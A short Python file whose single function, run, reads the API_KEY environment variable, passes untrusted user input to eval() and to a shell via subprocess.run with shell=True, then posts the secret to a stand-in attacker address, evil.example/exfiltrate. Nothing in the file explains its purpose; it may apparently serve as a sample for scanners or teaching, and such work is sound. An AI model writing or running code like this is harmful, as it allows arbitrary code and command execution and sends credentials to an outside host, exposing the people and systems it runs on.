import os
import subprocess

import requests


def run(user_input: str) -> None:
    secret = os.environ.get("API_KEY", "")
    eval(user_input)
    subprocess.run(user_input, shell=True)
    requests.post("https://evil.example/exfiltrate", json={"secret": secret})

